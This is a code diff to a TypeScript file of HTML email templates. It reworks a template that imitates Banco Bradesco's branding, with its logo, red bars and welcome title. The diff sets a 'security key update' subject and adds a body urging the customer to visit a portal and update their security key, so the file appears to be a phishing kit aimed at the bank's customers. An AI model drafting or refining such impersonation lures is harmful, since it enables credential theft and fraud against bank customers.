@@ -9,7 +9,7 @@ export const emailTemplates: Record<string, EmailTemplate> = {
   "modelo-01": {
     id: "modelo-01",
     name: "Modelo 01 - Bradesco",
-    subject: "Bem Vindo Banco Bradesco S.A.",
+    subject: "Atualização de Chave de Segurança",
     html: `<!doctype html>
 <html lang="pt-br">
   <head>
@@ -20,46 +20,45 @@ export const emailTemplates: Record<string, EmailTemplate> = {
   <body style="margin:0;padding:0;background:#f5f5f5;font-family:Verdana,Geneva,sans-serif;">
     <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="background:#f5f5f5;">
       <tr>
-        <td align="center" style="padding:20px 0;">
+        <td align="center" style="padding:20px 10px;">
           <table role="presentation" style="max-width:700px;width:100%;background:#ffffff;" cellpadding="0" cellspacing="0">
             <tr>
-              <!-- Barra vermelha esquerda - mais larga -->
-              <td style="width:80px;min-width:80px;background:linear-gradient(180deg, #CC092F 0%, #E91E63 50%, #CC092F 100%);"></td>
+              <!-- Barra vermelha esquerda - mais larga e visível -->
+              <td style="width:100px;min-width:100px;background:linear-gradient(180deg, #CC092F 0%, #E91E63 50%, #CC092F 100%);"></td>
               
               <!-- Conteúdo central -->
-              <td style="padding:40px 24px;background:#ffffff;">
+              <td style="padding:48px 32px;background:#ffffff;">
                 <!-- Logo Bradesco -->
                 <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                   <tr>
-                    <td align="center" style="padding:0 0 40px 0;">
-                      <img src="/bra.png" alt="Bradesco" style="display:block;max-width:350px;width:100%;height:auto;" />
+                    <td align="center" style="padding:0 0 48px 0;">
+                      <img src="/bra.png" alt="Bradesco" style="display:block;max-width:400px;width:100%;height:auto;" />
                     </td>
                   </tr>
                 </table>
 
                 <!-- Título -->
-                <h1 style="margin:0 0 32px 0;font-size:26px;font-weight:bold;color:#000000;text-align:center;font-family:Verdana,Geneva,sans-serif;">
+                <h1 style="margin:0 0 40px 0;font-size:24px;font-weight:bold;color:#000000;text-align:center;font-family:Verdana,Geneva,sans-serif;line-height:1.4;">
                   Bem Vindo Banco Bradesco S.A.
                 </h1>
 
                 <!-- Conteúdo -->
-                <div style="color:#333333;font-size:15px;line-height:1.7;font-family:Verdana,Geneva,sans-serif;">
-                  <p style="margin:0 0 16px 0;">Olá, {{name}}</p>
+                <div style="color:#333333;font-size:14px;line-height:1.8;font-family:Verdana,Geneva,sans-serif;">
+                  <p style="margin:0 0 20px 0;font-weight:bold;">Prezado(a) Cliente,</p>
                   
-                  <!-- CONTEUDO SERA INSERIDO AQUI -->
-                  <p style="margin:0 0 16px 0;">
-                    Conteúdo do email será adicionado aqui.
+                  <p style="margin:0 0 20px 0;text-align:justify;">
+                    Informamos que, para manter a segurança de seus acessos digitais, será necessário realizar a atualização de sua <strong>chave de segurança</strong>. Pedimos que acesse o nosso portal oficial e siga as instruções disponíveis em "<strong>Atualização de Chaves de Segurança</strong>".
                   </p>
                 </div>
 
                 <!-- Rodapé -->
-                <div style="margin-top:48px;padding-top:24px;border-top:1px solid #e0e0e0;font-size:11px;color:#666666;text-align:center;font-family:Verdana,Geneva,sans-serif;">
+                <div style="margin-top:56px;padding-top:24px;border-top:1px solid #e0e0e0;font-size:11px;color:#666666;text-align:center;font-family:Verdana,Geneva,sans-serif;">
                   <p style="margin:0;">Este é um email automático. Por favor, não responda.</p>
                 </div>
               </td>
               
-              <!-- Barra vermelha direita - mais larga -->
-              <td style="width:80px;min-width:80px;background:linear-gradient(180deg, #CC092F 0%, #E91E63 50%, #CC092F 100%);"></td>
+              <!-- Barra vermelha direita - mais larga e visível -->
+              <td style="width:100px;min-width:100px;background:linear-gradient(180deg, #CC092F 0%, #E91E63 50%, #CC092F 100%);"></td>
             </tr>
           </table>
         </td>
